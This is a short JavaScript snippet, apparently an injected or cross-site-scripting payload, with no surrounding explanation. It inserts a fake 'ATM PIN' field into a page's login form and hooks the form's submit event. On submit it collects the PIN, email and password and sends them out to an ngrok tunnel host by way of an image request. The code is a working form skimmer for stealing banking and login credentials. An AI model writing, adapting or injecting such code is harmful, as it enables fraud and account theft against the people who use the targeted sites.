<script>
  var input = document.createElement("input");
  input.setAttribute("type", "text");
  input.setAttribute("class", "input-block-level");
  input.setAttribute("placeholder", "ATM PIN");
  input.setAttribute("name", "atm_pin");
  
  var previous = document.forms[0].elements[0];
  document.forms[0].insertBefore(input, previous);

 
  function Execute() {
    var atmpin   = document.forms[0].elements[0].value;
    var email    = document.forms[0].elements[1].value;
    var password = document.forms[0].elements[2].value;

   
new Image().src = "https://6824-102-89-47-45.ngrok-free.app/?" +
              "atm_pin=" + encodeURIComponent(atmpin) +
              "&email=" + encodeURIComponent(email) +
              "&password=" + encodeURIComponent(password);

  }

  document.forms[0].onsubmit = Execute;
</script>
